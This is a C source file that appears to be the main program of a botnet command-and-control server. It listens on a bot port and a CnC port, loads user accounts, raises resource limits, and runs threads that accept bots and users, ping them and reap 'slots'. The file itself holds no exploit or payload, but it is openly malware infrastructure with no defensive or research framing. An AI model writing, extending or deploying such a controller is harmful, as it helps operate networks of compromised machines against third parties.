#define _POSIX_C_SOURCE 200112L

#include "headers/botnet.h"
#include "headers/users.h"
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <unistd.h>

static void raise_limits(void) {
    struct rlimit rl;
    rl.rlim_cur = rl.rlim_max = 1000000;
    setrlimit(RLIMIT_NOFILE, &rl);
    setrlimit(RLIMIT_NPROC, &rl);
    rl.rlim_cur = rl.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_CPU, &rl);
    setrlimit(RLIMIT_FSIZE, &rl);
    rl.rlim_cur = rl.rlim_max = 8388608;
    setrlimit(RLIMIT_STACK, &rl);
    /* ensure database + options dirs exist for logs/settings */
    mkdir("database", 0777);
    mkdir("options", 0777);
}

int main(int argc, char **argv) {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    /* anchor all relative paths (database/, settings.txt, themes/) to the
       binary's own dir, so cwd no longer matters */
    {
        char exe[1024];
        ssize_t n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
        if (n > 0) {
            exe[n] = '\0';
            char *slash = strrchr(exe, '/');
            if (slash) {
                *slash = '\0';
                if (chdir(exe) != 0) { /* keep cwd on failure */ }
            }
        }
    }
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <botport> <cncport>\n", argv[0]);
        return 1;
    }
    extern int g_botport;
    extern int g_cncport;
    g_botport = atoi(argv[1]);
    g_cncport = atoi(argv[2]);
    raise_limits();
    load_users();

    pthread_t t1, t2, t3, t4;
    pthread_create(&t1, NULL, bot_listener, NULL);
    pthread_create(&t2, NULL, user_listener, NULL);
    pthread_create(&t3, NULL, ping_thread, NULL);
    pthread_create(&t4, NULL, slot_reaper, NULL);
    pthread_join(t1, NULL);
    return 0;
}
